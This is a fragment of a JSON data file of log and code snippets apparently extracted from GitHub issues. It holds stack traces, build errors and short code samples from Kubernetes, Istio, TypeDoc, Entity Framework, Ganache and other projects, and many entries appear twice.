        "logs": "```\r\nI0207 04:04:21.578006    3515 kubelet.go:2316] SyncLoop (ADD, \"api\"): \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\"\r\nW0207 04:04:21.578865    3515 manager.go:173] Container readiness changed for unknown container: \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\" - \"://\"\r\nI0207 04:04:21.591854    3515 manager.go:1551] Need to restart pod infra container for \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\" because it is not found\r\nI0207 04:04:22.149903    3515 kubelet.go:2338] SyncLoop (PLEG): \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\", event: &pleg.PodLifecycleEvent{ID:\"de019055-cd4f-11e5-98b0-42010af00007\", Type:\"ContainerStarted\", Data:\"5fca6b5e43a03a31739abd73841af77e61ba687a16368418871ff178a13d8057\"}\r\nI0207 04:06:25.161553    3515 kubelet.go:2322] SyncLoop (REMOVE, \"api\"): \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\"\r\n"
    },
    {
        "logs": "`\r\nUSS-Kelvin [devtools-author] (issue-#19/install-sinon-chrome) $ karma start\r\n09 02 2016 16:23:39.140:WARN [karma]: No captured browser, open http://localhost:9876/\r\n09 02 2016 16:23:39.157:INFO [karma]: Karma v0.13.19 server started at http://localhost:9876/\r\n09 02 2016 16:23:39.167:INFO [launcher]: Starting browser Chrome\r\n09 02 2016 16:23:41.007:INFO [Chrome 48.0.2564 (Mac OS X 10.11.3)]: Connected on socket /#VLUutoLJWC3ulCwKAAAA with id 78999512\r\nChrome 48.0.2564 (Mac OS X 10.11.3) ERROR\r\n  Uncaught TypeError: Cannot read property 'panels' of undefined\r\n  at /Users/username_0/Engineering/devtools-author/app/scripts/devtools.js:9\r\n\r\n09 02 2016 16:23:41.411:WARN [web-server]: 404: /dist/scripts/themes.json\r\n"
    },
    {
        "logs": "`\r\n/Project/node_modules/typedoc/dist/lib/output/plugins/MarkedPlugin.js:43\r\n        Marked.setOptions({\r\n               ^\r\n\r\nTypeError: Marked.setOptions is not a function\r\n    at MarkedPlugin.initialize (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/plugins/MarkedPlugin.js:43:16)\r\n    at MarkedPlugin.AbstractComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:87:15)\r\n    at MarkedPlugin.RendererComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/components.js:21:42)\r\n    at MarkedPlugin.ContextAwareRendererComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/components.js:29:47)\r\n    at new MarkedPlugin (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/plugins/MarkedPlugin.js:31:47)\r\n    at Renderer.ChildableComponent.addComponent /Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:159:68)\r\n    at Renderer.ChildableComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:133:19)\r\n    at new Renderer (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/renderer.js:31:42)\r\n    at CliApplication.ChildableComponent.addComponent (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:159:68)\r\n    at CliApplication.Application [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/application.js:38:32)\r\n"
    },
    {
        "logs": "`\r\nError: /Projects/aws-lex-proxy/node_modules/typescript/lib/typescript.d.ts(3462)\r\n Declaration or statement expected.\r\nError: /Projects/aws-lex-proxy/node_modules/typescript/lib/typescript.d.ts(3530)\r\n ']' expected.\r\nError: /Projects/aws-lex-proxy/node_modules/typescript/lib/typescript.d.ts(3530)\r\n ')' expected.\r\n\r\n"
    },
    {
        "logs": "```\r\n/Project/node_modules/typedoc/dist/lib/output/plugins/MarkedPlugin.js:43\r\n        Marked.setOptions({\r\n               ^\r\n\r\nTypeError: Marked.setOptions is not a function\r\n    at MarkedPlugin.initialize (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/plugins/MarkedPlugin.js:43:16)\r\n    at MarkedPlugin.AbstractComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:87:15)\r\n    at MarkedPlugin.RendererComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/components.js:21:42)\r\n    at MarkedPlugin.ContextAwareRendererComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/components.js:29:47)\r\n    at new MarkedPlugin (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/plugins/MarkedPlugin.js:31:47)\r\n    at Renderer.ChildableComponent.addComponent /Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:159:68)\r\n    at Renderer.ChildableComponent [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:133:19)\r\n    at new Renderer (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/output/renderer.js:31:42)\r\n    at CliApplication.ChildableComponent.addComponent (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/utils/component.js:159:68)\r\n    at CliApplication.Application [as constructor] (/Projects/aws-lex-proxy/node_modules/typedoc/dist/lib/application.js:38:32)\r\n"
    },
    {
        "logs": "```\r\nError: /Projects/aws-lex-proxy/node_modules/typescript/lib/typescript.d.ts(3462)\r\n Declaration or statement expected.\r\nError: /Projects/aws-lex-proxy/node_modules/typescript/lib/typescript.d.ts(3530)\r\n ']' expected.\r\nError: /Projects/aws-lex-proxy/node_modules/typescript/lib/typescript.d.ts(3530)\r\n ')' expected.\r\n\r\n"
    },
    {
        "logs": "`react\r\n<ReactQuill\r\n        ref={ref => {\r\n            this.reactQuillRef = ref;\r\n        }}\r\n        onChange={this.onChange}\r\n        defaultValue={this.state.content}\r\n        modules={{\r\n            toolbar: false\r\n        }}\r\n        readOnly={this.state.saving}\r\n        formats={[\"bold\", \"italic\", \"underline\", \"video\", \"image\", \"link\"]}\r\n        className=\"release-editor\"\r\n        placeholder=\"Escreva seu release aqui com no m\u00ednimo 250 caracteres...\"\r\n/>\r\n"
    },
    {
        "logs": "`\r\nptf> use crackmapexec\r\n[!] [!] DANGER WILL ROBINSON. DANGER WILL ROBINSON. Error has occurred.\r\n[!] [!] It's not possible its due to my coding skillz, it must be you? :-)\r\n[!] [!] Printing that error. Get that error. You get it: module not found\r\n"
    },
    {
        "logs": "```\r\nptf> use crackmapexec\r\n[!] [!] DANGER WILL ROBINSON. DANGER WILL ROBINSON. Error has occurred.\r\n[!] [!] It's not possible its due to my coding skillz, it must be you? :-)\r\n[!] [!] Printing that error. Get that error. You get it: module not found\r\n"
    },
    {
        "logs": "` r\r\nlibrary(robotstxt)\r\n\r\n# doesn't work\r\npaths_allowed(\"https://www.google.com\")\r\n#> www.google.com\r\n#> Error in if (is_http) {: argument is of length zero\r\n\r\n# works\r\npaths_allowed(\"https://google.com\")\r\n#>  google.com                      No encoding supplied: defaulting to UTF-8.\r\n#> [1] TRUE\r\n"
    },
    {
        "logs": "` r\r\nlibrary(robotstxt)\r\n\r\n# doesn't work\r\npaths_allowed(\"https://www.google.com\")\r\n#> www.google.com\r\n#> Error in if (is_http) {: argument is of length zero\r\n\r\n# works\r\npaths_allowed(\"https://google.com\")\r\n#>  google.com                      No encoding supplied: defaulting to UTF-8.\r\n#> [1] TRUE\r\n"
    },
    {
        "logs": "` r\r\nlibrary(robotstxt)\r\npackageVersion(\"robotstxt\")\r\n#> [1] '0.7.2'\r\n\r\n# works, but warning\r\npaths_allowed(\"https://www.google.com\")\r\n#>  www.google.com\r\n#> Warning in FUN(X[[i]], ...): partial argument match of 'x' to 'xp'\r\n#> [1] TRUE\r\n\r\n# also works, but also warning\r\npaths_allowed(\"https://google.com\")\r\n#>  google.com\r\n#> Warning in FUN(X[[i]], ...): partial argument match of 'x' to 'xp'\r\n#> [1] TRUE\r\n"
    },
    {
        "logs": "`\r\nusing UnityEngine;\r\nusing MessagePack;\r\nusing MessagePack.Resolvers;\r\n\r\npublic class Test : MonoBehaviour\r\n{\r\n    void Start()\r\n    {\r\n        var data1 = new TestDataWithField();\r\n        MessagePackSerializer.Serialize(data1);\r\n        MessagePackSerializer.Serialize(data1, StandardResolverAllowPrivate.Options);\r\n\r\n        var data2 = new TestDataWithNoField();\r\n        MessagePackSerializer.Serialize(data2);\r\n        MessagePackSerializer.Serialize(data2, StandardResolverAllowPrivate.Options);   // <-Unity application crashes\r\n    }\r\n\r\n    [MessagePackObject]\r\n    public class TestDataWithField\r\n    {\r\n        [Key(0)]\r\n        public int Dummy;\r\n    }\r\n\r\n    [MessagePackObject]\r\n    public class TestDataWithNoField\r\n    {\r\n    }\r\n}\r\n"
    },
    {
        "logs": "`\r\nError: Given input \"NaN\" is not a number.\r\n    at Object.numberToHex (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-utils/src/utils.js:273:15)\r\n    at Method.inputBlockNumberFormatter (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-helpers/src/formatters.js:124:125)\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:150:38\r\n    at Array.map (<anonymous>)\r\n    at Method.formatInput (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:148:32)\r\n    at Method.toPayload (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:183:23)\r\n    at Eth.send [as getBlock] (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:617:30)\r\n    at ForkedBlockchain.getFallbackBlock (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:357:17)\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:411:19\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:312:5\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:777:5\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/blockchain_double.js:204:5\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/database/blockserializer.js:45:9\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/async/dist/async.js:473:16\r\n    at replenish (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/async/dist/async.js:1006:25)\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/async/dist/async.js:1016:9\r\n"
    },
    {
        "logs": "```\r\nError: Given input \"NaN\" is not a number.\r\n    at Object.numberToHex (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-utils/src/utils.js:273:15)\r\n    at Method.inputBlockNumberFormatter (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-helpers/src/formatters.js:124:125)\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:150:38\r\n    at Array.map (<anonymous>)\r\n    at Method.formatInput (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:148:32)\r\n    at Method.toPayload (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:183:23)\r\n    at Eth.send [as getBlock] (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/web3-core-method/src/index.js:617:30)\r\n    at ForkedBlockchain.getFallbackBlock (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:357:17)\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:411:19\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:312:5\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/forking/forked_blockchain.js:777:5\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/blockchain_double.js:204:5\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/lib/database/blockserializer.js:45:9\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/async/dist/async.js:473:16\r\n    at replenish (/Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/async/dist/async.js:1006:25)\r\n    at /Applications/Ganache.app/Contents/Resources/static/node/node_modules/ganache-core/node_modules/async/dist/async.js:1016:9\r\n"
    },
    {
        "logs": "`\r\ncaller=main.go:324 msg=\"Error querying Prometheus instance\" err=\"execute query: Error querying Prometheus: client_error: client error: 403\"\r\n"
    },
    {
        "logs": "```\r\ncaller=main.go:324 msg=\"Error querying Prometheus instance\" err=\"execute query: Error querying Prometheus: client_error: client error: 403\"\r\n"
    },
    {
        "logs": "`\r\nArgumentNullException: Value cannot be null. Parameter name: entityType\r\n\r\n    Microsoft.EntityFrameworkCore.Utilities.Check.NotNull<T>(T value, string parameterName)\r\n    Microsoft.EntityFrameworkCore.SqlServerMetadataExtensions.SqlServer(IEntityType entityType)\r\n    Audit.EntityFramework.DbContextHelper.GetEntityName(IEntityType entityType)\r\n    Audit.EntityFramework.DbContextHelper.CreateAuditEvent(IAuditDbContext context)\r\n    Audit.EntityFramework.DbContextHelper+<SaveChangesAsync>d__26.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    Audit.EntityFramework.AuditDbContext+<SaveChangesAsync>d__32.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    MyCode.MyDbContext+<SaveChangesAsync>d__6.MoveNext() in MyDbContext.cs\r\n\r\n                return await base.SaveChangesAsync();\r\n"
    },
    {
        "logs": "`c#\r\nNullReferenceException: Object reference not set to an instance of an object.\r\n    Audit.EntityFramework.DbContextHelper.GetForeignKeys(DbContext dbContext, EntityEntry entry)\r\n    Audit.EntityFramework.DbContextHelper.UpdateAuditEvent(EntityFrameworkEvent efEvent, IAuditDbContext context)\r\n    Audit.EntityFramework.DbContextHelper.SaveScope(IAuditDbContext context, AuditScope scope, EntityFrameworkEvent event)\r\n    Audit.EntityFramework.DbContextHelper+<SaveChangesAsync>d__24.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    Audit.EntityFramework.AuditDbContext+<SaveChangesAsync>d__32.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    auditproblem.Controllers.HomeController+<TriggerError>d__3.MoveNext() in HomeController.cs\r\n\r\n                await _dbContext.SaveChangesAsync();\r\n"
    },
    {
        "logs": "`c#\r\nArgumentNullException: Value cannot be null. Parameter name: entityType\r\n\r\n    Microsoft.EntityFrameworkCore.Utilities.Check.NotNull<T>(T value, string parameterName)\r\n    Microsoft.EntityFrameworkCore.SqlServerMetadataExtensions.SqlServer(IEntityType entityType)\r\n    Audit.EntityFramework.DbContextHelper.GetEntityName(IEntityType entityType)\r\n    Audit.EntityFramework.DbContextHelper.CreateAuditEvent(IAuditDbContext context)\r\n    Audit.EntityFramework.DbContextHelper+<SaveChangesAsync>d__26.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    Audit.EntityFramework.AuditDbContext+<SaveChangesAsync>d__32.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    MyCode.MyDbContext+<SaveChangesAsync>d__6.MoveNext() in MyDbContext.cs\r\n\r\n                return await base.SaveChangesAsync();\r\n"
    },
    {
        "logs": "```\r\nArgumentNullException: Value cannot be null. Parameter name: entityType\r\n\r\n    Microsoft.EntityFrameworkCore.Utilities.Check.NotNull<T>(T value, string parameterName)\r\n    Microsoft.EntityFrameworkCore.SqlServerMetadataExtensions.SqlServer(IEntityType entityType)\r\n    Audit.EntityFramework.DbContextHelper.GetEntityName(IEntityType entityType)\r\n    Audit.EntityFramework.DbContextHelper.CreateAuditEvent(IAuditDbContext context)\r\n    Audit.EntityFramework.DbContextHelper+<SaveChangesAsync>d__26.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    Audit.EntityFramework.AuditDbContext+<SaveChangesAsync>d__32.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    MyCode.MyDbContext+<SaveChangesAsync>d__6.MoveNext() in MyDbContext.cs\r\n\r\n                return await base.SaveChangesAsync();\r\n"
    },
    {
        "logs": "```c#\r\nNullReferenceException: Object reference not set to an instance of an object.\r\n    Audit.EntityFramework.DbContextHelper.GetForeignKeys(DbContext dbContext, EntityEntry entry)\r\n    Audit.EntityFramework.DbContextHelper.UpdateAuditEvent(EntityFrameworkEvent efEvent, IAuditDbContext context)\r\n    Audit.EntityFramework.DbContextHelper.SaveScope(IAuditDbContext context, AuditScope scope, EntityFrameworkEvent event)\r\n    Audit.EntityFramework.DbContextHelper+<SaveChangesAsync>d__24.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    Audit.EntityFramework.AuditDbContext+<SaveChangesAsync>d__32.MoveNext()\r\n    System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n    System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n    System.Runtime.CompilerServices.TaskAwaiter.GetResult()\r\n    auditproblem.Controllers.HomeController+<TriggerError>d__3.MoveNext() in HomeController.cs\r\n\r\n                await _dbContext.SaveChangesAsync();\r\n"
    },
    {
        "logs": "`Error creating: Internal error occurred: failed calling webhook \"sidecar-injector.istio.io\": Post https: //istio-sidecar-injector.istio-system.svc:443/inject?timeout=30s: net/http: request canceled while waiting for connection (Client.Timeout exceeded while await ing headers)"
    },
    {
        "logs": "`Error from server (Timeout): error when creating \"STDIN\": Timeout: request did not complete within requested timeout 30s"
    },
    {
        "logs": "`\r\n\r\n\r\n**Environment where bug was observed (cloud vendor, OS, etc)**\r\nAWS EKS.\r\nAdditionally, please consider attaching a [cluster state archive](http://istio.io/help/bugs/#generating-a-cluster-state-archive) by attaching\r\nthe dump file to this issue.\n<issue_comment>username_0: Since the port 443 between control plane and the worker nodes are enabled by default, I began to suspect whether the issue is due to the overlay network by Weave on EKS. But I am not sure and that's why I raised this issue here.\r\n\r\nHowever, my another k8s cluster setup by "
    },
    {
        "logs": "` on AWS also using Weave overlay network, and the istio works fine.\n<issue_comment>username_0: Just made another try, and find the manual injection works.\r\n- removed the auto inject labels in the namespace\r\n- Manual inject with "
    },
    {
        "logs": "`\r\n\r\nSo this looks like the sidecar-injector webhook not work. However, this [blog](https://aws.amazon.com/about-aws/whats-new/2018/10/amazon-eks-enables-support-for-kubernetes-dynamic-admission-cont/) Amazon claims EKS added the support to the webhook/controller. \r\n\r\nReally confused, anyone has idea?\n<issue_comment>username_1: @username_0 Been trying to get this to work for days. I ran into this, you actually need to run both the AWS and WeaveNet CNIs in parallel (pods with multiple network interfaces). This can be accomplished with CNI-Genie. The reason for this is that the validation webhooks Istio uses cannot be sent to the WeaveNet subnet CIDR range.\r\n\r\nHere's how I did it:\r\n1) Modify the CNI-Genie config to use "
    },
    {
        "logs": "`\r\nInvalid value: v1.LabelSelector{MatchLabels:map[string]string{\"app\":\"ml-pipeline-viewer-crd\", \"app.kubernetes.io/component\":\"pipelines-viewer\", \"app.kubernetes.io/name\":\"pipelines-viewer\", \"kapp.k14s.io/a$\r\np\":\"1598878090435084849\"}, MatchExpressions:[]v1.LabelSelectorRequirement(nil)}: field is immutable (reason: Invalid)\r\n"
    },
    {
        "logs": "```\r\nInvalid value: v1.LabelSelector{MatchLabels:map[string]string{\"app\":\"ml-pipeline-viewer-crd\", \"app.kubernetes.io/component\":\"pipelines-viewer\", \"app.kubernetes.io/name\":\"pipelines-viewer\", \"kapp.k14s.io/a$\r\np\":\"1598878090435084849\"}, MatchExpressions:[]v1.LabelSelectorRequirement(nil)}: field is immutable (reason: Invalid)\r\n"
    },
    {
        "logs": "`\r\n  task automatic csr_rd(input  uvm_object     ptr, // accept reg or field\r\n                        output uvm_reg_data_t value,\r\n                        input  uvm_check_e    check = UVM_CHECK,\r\n                        input  uvm_path_e     path = UVM_DEFAULT_PATH,\r\n                        input  bit            blocking = default_csr_blocking,\r\n                        input  bit            backdoor = 0,\r\n                        input  uint           timeout_ns = default_timeout_ns,\r\n                        input  uvm_reg_map    map = null);\r\n    if (backdoor) begin\r\n        csr_peek(ptr, value, check);\r\n    end else if (blocking) begin\r\n      csr_rd_sub(ptr, value, check, path, timeout_ns, map);\r\n    end else begin\r\n      fork\r\n        csr_rd_sub(ptr, value, check, path, timeout_ns, map);\r\n      join_none\r\n      // Add #0 to ensure that this thread starts executing before any subsequent call\r\n      #0;\r\n    end\r\n  endtask\r\n"
    },
    {
        "logs": "```\r\n  task automatic csr_rd(input  uvm_object     ptr, // accept reg or field\r\n                        output uvm_reg_data_t value,\r\n                        input  uvm_check_e    check = UVM_CHECK,\r\n                        input  uvm_path_e     path = UVM_DEFAULT_PATH,\r\n                        input  bit            blocking = default_csr_blocking,\r\n                        input  bit            backdoor = 0,\r\n                        input  uint           timeout_ns = default_timeout_ns,\r\n                        input  uvm_reg_map    map = null);\r\n    if (backdoor) begin\r\n        csr_peek(ptr, value, check);\r\n    end else if (blocking) begin\r\n      csr_rd_sub(ptr, value, check, path, timeout_ns, map);\r\n    end else begin\r\n      fork\r\n        csr_rd_sub(ptr, value, check, path, timeout_ns, map);\r\n      join_none\r\n      // Add #0 to ensure that this thread starts executing before any subsequent call\r\n      #0;\r\n    end\r\n  endtask\r\n"
    },
    {
        "logs": "`c#\r\npublic static void Main(string[] args)\r\n        {\r\n            var host = CreateHostBuilder(args).Build();\r\n            var ctx = host.Services.CreateScope().ServiceProvider.GetRequiredService<ApplicationDbContext>();\r\n\r\n            ctx.Database.Migrate();\r\n\r\n            \r\n            var existing = ctx.Set<MasterTrunk>().Any();\r\n            var existing2 = ctx.Set<MasterTrunk>().FirstOrDefault(); //exception Sequence contains no elements.\r\n           }\r\n"
    },
    {
        "logs": "`\r\n\r\n### Build Logs\r\n\r\n<!--\r\n1. Place cursor below this comment block.\r\n2. Attach build log or link to gist (https://gist.github.com/) of the log.\r\n3. Logs can be found in the Build Output tab of the Errors pad in Visual Studio\r\nTo get full build logs, set the log verbosity to diagnostic at the following locations:\r\n- On Visual Studio for Mac: Preferences > Projects > Build\r\n- On Visual Studio for Windows: Tools > Options > Projects and Solutions > Build and Run\r\nOn Visual Studio for Windows you also want to add "
    },
    {
        "logs": "`.\r\n-->\r\n\r\n### Example Project (If Possible)\r\n\r\n<!--\r\n1. Place cursor below this comment block.\r\n2. Drag and drop the compressed project or files needed to reproduce.\r\n-->\r\n\r\n<!--\r\nSwitch to the \"Preview\" tab to ensure your issue renders correctly.\r\n-->\n<issue_comment>username_1: You can cast to "
    },
    {
        "logs": "```\r\n\r\n### Build Logs\r\n\r\n<!--\r\n1. Place cursor below this comment block.\r\n2. Attach build log or link to gist (https://gist.github.com/) of the log.\r\n3. Logs can be found in the Build Output tab of the Errors pad in Visual Studio\r\nTo get full build logs, set the log verbosity to diagnostic at the following locations:\r\n- On Visual Studio for Mac: Preferences > Projects > Build\r\n- On Visual Studio for Windows: Tools > Options > Projects and Solutions > Build and Run\r\nOn Visual Studio for Windows you also want to add `-v -v -v -v` to the mtouch additional arguments by right-clicking the project in the solution explorer and selecting `Properties`.\r\n-->\r\n\r\n### Example Project (If Possible)\r\n\r\n<!--\r\n1. Place cursor below this comment block.\r\n2. Drag and drop the compressed project or files needed to reproduce.\r\n-->\r\n\r\n<!--\r\nSwitch to the \"Preview\" tab to ensure your issue renders correctly.\r\n-->\n<issue_comment>username_1: You can cast to `IntPtr` before casting to `void *`:\r\n\r\n"
    },
    {
        "logs": "`\r\n  File \"/workspaces/home-assistant-core/homeassistant/components/overkiz/sensor.py\", line 56, in <lambda>\r\n    native_value=lambda value: int(str(value).strip(\"%\")),\r\nValueError: invalid literal for int() with base 10: '59.0'\r\n"
    },
    {
        "logs": "```\r\n  File \"/workspaces/home-assistant-core/homeassistant/components/overkiz/sensor.py\", line 56, in <lambda>\r\n    native_value=lambda value: int(str(value).strip(\"%\")),\r\nValueError: invalid literal for int() with base 10: '59.0'\r\n"
    },
    {
        "logs": "`\r\n\r\nI'm guessing the lexer or parser could be adjusted to allow for this?\n<issue_comment>username_1: Yes, this looks like a bug.  An extra test & pull request to the lexer would be much appreciated.\n<issue_comment>username_2: Current, you need a space after the "
    },
    {
        "logs": "` without a space after it. The offending regex was first added in #1587.\n<issue_comment>username_1: I think we should only require the space if there is at least one character of text.\n<issue_comment>username_2: @username_1, currently it's just the opposite: you don't need a space before text for it to work, but you _do_ need a space after "
    },
    {
        "logs": "```\r\n\r\nI'm guessing the lexer or parser could be adjusted to allow for this?\n<issue_comment>username_1: Yes, this looks like a bug.  An extra test & pull request to the lexer would be much appreciated.\n<issue_comment>username_2: Current, you need a space after the `|` to make it recognize the line as text. The [code in lexer](https://github.com/pugjs/pug-lexer/blob/035c891823b2193121421dc3db660810deac6b3e/index.js#L539-L540) specifically excludes `|` without a space after it. The offending regex was first added in #1587.\n<issue_comment>username_1: I think we should only require the space if there is at least one character of text.\n<issue_comment>username_2: @username_1, currently it's just the opposite: you don't need a space before text for it to work, but you _do_ need a space after `|` if there is no text for it to work.\r\n\r\n"
    },
    {
        "logs": "`\r\ndebug(debug($this->request->data));\r\n[\r\n\r\n\t'image' => [\r\n\t\t'name' => 'name.jpg',\r\n\t\t'type' => 'image/jpeg',\r\n\t\t'tmp_name' => '/tmp/tmp_name',\r\n\t\t'error' => (int) 0,\r\n\t\t'size' => (int) 22222\r\n\t],\r\n        'other'=>'sample'\r\n]\r\n"
    },
    {
        "logs": "```\r\ndebug(debug($this->request->data));\r\n[\r\n\r\n\t'image' => [\r\n\t\t'name' => 'name.jpg',\r\n\t\t'type' => 'image/jpeg',\r\n\t\t'tmp_name' => '/tmp/tmp_name',\r\n\t\t'error' => (int) 0,\r\n\t\t'size' => (int) 22222\r\n\t],\r\n        'other'=>'sample'\r\n]\r\n"
    },
    {
        "logs": "`\r\n$ git log -1\r\ncommit aa3b07422c46d5e11a7ee4b7236230b4b2dfbbea\r\nAuthor: Adam Grare <username_1@redhat.com>\r\nDate:   Thu Nov 29 08:50:41 2018 -0500\r\n\r\n    Merge pull request #18230 from username_0/rfe/upgrade_cluster_role_options\r\n    \r\n    Add job_timeout parameter for upgrade_cluster\r\n    \r\n    (cherry picked from commit 0e1006bce4c40edaa7059247886ad08524f97b8c)\r\n    \r\n    https://bugzilla.redhat.com/show_bug.cgi?id=1644605\r\n"
    },
    {
        "logs": "```\r\n$ git log -1\r\ncommit aa3b07422c46d5e11a7ee4b7236230b4b2dfbbea\r\nAuthor: Adam Grare <username_1@redhat.com>\r\nDate:   Thu Nov 29 08:50:41 2018 -0500\r\n\r\n    Merge pull request #18230 from username_0/rfe/upgrade_cluster_role_options\r\n    \r\n    Add job_timeout parameter for upgrade_cluster\r\n    \r\n    (cherry picked from commit 0e1006bce4c40edaa7059247886ad08524f97b8c)\r\n    \r\n    https://bugzilla.redhat.com/show_bug.cgi?id=1644605\r\n"
    },
    {
        "logs": "`\r\n\r\nThanks for attention, hope you like my input.\r\n\r\nand thanks for your code!\n<issue_comment>username_3: It also looks like you have an error in\r\n\r\n"
    },
    {
